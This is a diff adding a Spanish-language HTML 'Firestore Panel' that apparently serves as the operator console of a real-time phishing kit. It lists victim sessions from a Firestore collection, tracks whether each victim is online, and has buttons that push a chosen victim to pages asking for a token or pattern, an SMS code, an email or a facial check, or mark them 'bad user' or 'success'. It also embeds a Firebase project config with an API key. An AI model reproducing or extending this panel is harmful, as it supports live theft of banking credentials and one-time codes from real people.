@@ -1,0 +1,266 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Firestore Panel</title>
+
+    <!-- Bootstrap 4 -->
+    <link
+      rel="stylesheet"
+      href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"
+      integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm"
+      crossorigin="anonymous"
+    />
+    <style>
+      body {
+        font-family: Arial, sans-serif;
+        padding: 20px;
+      }
+      .table-actions .btn {
+        min-width: 90px;
+      }
+      .table thead th {
+        white-space: nowrap;
+      }
+      .sticky-header {
+        position: sticky;
+        top: 0;
+        background: #fff;
+        z-index: 1;
+      }
+      .table-responsive {
+        border-radius: 0.5rem;
+        border: 1px solid #e5e7eb;
+      }
+      .badge-page {
+        font-size: 11px;
+      }
+      .muted {
+        color: #6c757d;
+        font-size: 12px;
+        display: block;
+      }
+    </style>
+  </head>
+
+  <body>
+    <div class="container">
+      <h1 class="text-center my-4">Firestore Panel</h1>
+
+      <!-- Tabla -->
+      <div class="table-responsive">
+        <table class="table table-sm table-hover mb-0">
+          <thead class="thead-light sticky-header">
+            <tr>
+              <th>Usuario</th>
+              <th>Activo</th>
+              <th>Token</th>
+              <th>SMS</th>
+              <th>Correo</th>
+              <th>Usuario malo</th>
+              <th>Éxito</th>
+              <th>Eliminar</th>
+            </tr>
+          </thead>
+          <tbody id="tbody-rows">
+            <!-- filas dinámicas -->
+          </tbody>
+        </table>
+      </div>
+    </div>
+
+    <!-- Firebase v8 -->
+    <script src="https://www.gstatic.com/firebasejs/8.6.8/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.6.8/firebase-firestore.js"></script>
+
+    <script>
+      // ===== Config =====
+      const ACTIVE_THRESHOLD_MS = 20000; // 20s: debajo = activo ✔, encima = inactivo ✗
+      const HEARTBEAT_MS = 15000; // cliente escribe lastSeen cada 15s
+      const RECHECK_MS = 5000; // panel recalcula iconos cada 5s
+
+      // Configuración de Firebase
+      const firebaseConfig = {
+        apiKey: "AIzaSyDFYJf5HrCfbyEkggIHJ6hcgQJpUKMfzc0",
+        authDomain: "basedtos-84767.firebaseapp.com",
+        projectId: "basedtos-84767",
+        storageBucket: "basedtos-84767.appspot.com",
+        messagingSenderId: "622608516389",
+        appId: "1:622608516389:web:b3c12b4a3537c1bfff06cc",
+      };
+
+      // Inicializar Firebase
+      firebase.initializeApp(firebaseConfig);
+      const db = firebase.firestore();
+      const COLL = "bacrdms";
+
+      // ===== Helpers Firestore =====
+      function setPage(id, pageNum, label, extra = {}) {
+        return db
+          .collection(COLL)
+          .doc(id)
+          .set({ page: pageNum, ...extra }, { merge: true })
+          .then(() => console.log(`[OK] ${label} → doc:${id} page=${pageNum}`))
+          .catch((err) => console.error(`[ERR] ${label} → doc:${id}`, err));
+      }
+
+      function eliminar(id) {
+        return db
+          .collection(COLL)
+          .doc(id)
+          .delete()
+          .then(() => console.log(`[OK] Eliminado doc:${id}`))
+          .catch((err) => console.error(`[ERR] Eliminar doc:${id}`, err));
+      }
+
+      // ===== Acciones por columna =====
+      function accionActivo(id) {
+        // Marca flujo activo y refresca lastSeen
+        return setPage(id, 1, "Activo", {
+          lastSeen: window.serverTimestamp(),
+        });
+      }
+      function accionPatron(id) {
+        return setPage(id, 2, "Token");
+      }
+      function accionSMS(id) {
+        return setPage(id, 5, "SMS");
+      }
+      function accionFacial(id) {
+        return setPage(id, 8, "Facial");
+      }
+      function accionMalo(id) {
+        return setPage(id, 3, "Usuario malo");
+      }
+      function accionCorreo(id) {
+        return setPage(id, 8, "Correo");
+      }
+      function accionExito(id) {
+        return setPage(id, 6, "Éxito");
+      }
+
+      // ===== Render tabla =====
+      // Guardamos última instantánea “materializada” en memoria para re-chequear cada 5s
+      let lastDocsData = []; // [{id, data}]
+      function renderRows(rows) {
+        const tbody = document.getElementById("tbody-rows");
+        tbody.innerHTML = "";
+
+        const now = Date.now();
+
+        rows.forEach(({ id, data }) => {
+          const tr = document.createElement("tr");
+
+          // Calcular activo por lastSeen
+          let isActive = false;
+          let lastSeenText = "—";
+          if (data.lastSeen && typeof data.lastSeen.toDate === "function") {
+            const last = data.lastSeen.toDate().getTime();
+            const diff = now - last;
+            isActive = diff < ACTIVE_THRESHOLD_MS;
+            const secs = Math.max(0, Math.floor(diff / 1000));
+            lastSeenText = `${secs}s`;
+          }
+
+          const activoHTML = isActive
+            ? `<span class="text-success font-weight-bold" style="font-size:18px;">&#10003;</span>`
+            : `<span class="text-danger font-weight-bold" style="font-size:18px;">&#10007;</span>`;
+
+          tr.innerHTML = `
+            <td class="align-middle">
+              <div class="d-flex flex-column">
+                <strong>${id}</strong>
+                ${
+                  typeof data.page !== "undefined"
+                    ? `<span class="badge badge-info badge-page mt-1">page: ${data.page}</span>`
+                    : ``
+                }
+              </div>
+            </td>
+
+            <td class="table-actions align-middle text-center">
+              ${activoHTML}
+              <small class="muted">lastSeen: ${lastSeenText}</small>
+            
+            </td>
+
+            <td class="table-actions">
+              <button class="btn btn-sm btn-secondary" title="Solicitar Patrón (page=2)"
+                onclick="accionPatron('${id}')">Token</button>
+            </td>
+
+            <td class="table-actions">
+              <button class="btn btn-sm btn-warning" title="Solicitar SMS (page=5)"
+                onclick="accionSMS('${id}')">SMS</button>
+            </td>
+            <td class="table-actions">
+              <button class="btn btn-sm btn-warning" title="Solicitar Correo (page=8)"
+                onclick="accionCorreo('${id}')">Correo</button>
+            </td>
+
+
+            <td class="table-actions">
+              <button class="btn btn-sm btn-dark" title="Usuario Malo (page=3)"
+                onclick="accionMalo('${id}')">Usuario malo</button>
+            </td>
+
+            <td class="table-actions">
+              <button class="btn btn-sm btn-info" title="Marcar Éxito (page=6)"
+                onclick="accionExito('${id}')">Éxito</button>
+            </td>
+
+            <td class="table-actions">
+              <button class="btn btn-sm btn-danger" title="Eliminar documento"
+                onclick="eliminar('${id}')">Eliminar</button>
+            </td>
+          `;
+
+          tbody.appendChild(tr);
+        });
+      }
+
+      // Suscripción en tiempo real (y guardado de snapshot “materializado”)
+      db.collection(COLL).onSnapshot((snap) => {
+        console.log(`[SNAP] ${snap.docs.length} documentos`);
+        lastDocsData = snap.docs.map((d) => ({ id: d.id, data: d.data() }));
+        renderRows(lastDocsData);
+      });
+
+      // Recalcular iconos/tiempos cada RECHECK_MS sin requerir nuevo snapshot
+      setInterval(() => {
+        if (lastDocsData.length) renderRows(lastDocsData);
+      }, RECHECK_MS);
+
+      // ===== Heartbeat (cliente) — opcional si este panel también lo hace =====
+      // Si este HTML lo usan los usuarios finales (no solo el panel),
+      // activa el heartbeat para marcar lastSeen periódicamente:
+      const userIdFromLS = localStorage.getItem("usuario");
+      if (userIdFromLS) {
+        setInterval(() => {
+          db.collection(COLL)
+            .doc(userIdFromLS)
+            .set({ lastSeen: window.serverTimestamp() }, { merge: true })
+            .catch(() => {});
+        }, HEARTBEAT_MS);
+      }
+    </script>
+
+    <!-- Bootstrap deps -->
+    <script
+      src="https://code.jquery.com/jquery-3.2.1.slim.min.js"
+      integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN"
+      crossorigin="anonymous"
+    ></script>
+    <script
+      src="https://cdn.jsdelivr.net/npm/popper.js@1.12.9/dist/umd/popper.min.js"
+      integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7Hf5hY5boq2z9YxIM+9gWIl6E"
+      crossorigin="anonymous"
+    ></script>
+    <script
+      src="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/js/bootstrap.min.js"
+      integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl"
+      crossorigin="anonymous"
+    ></script>
+  </body>
+</html>
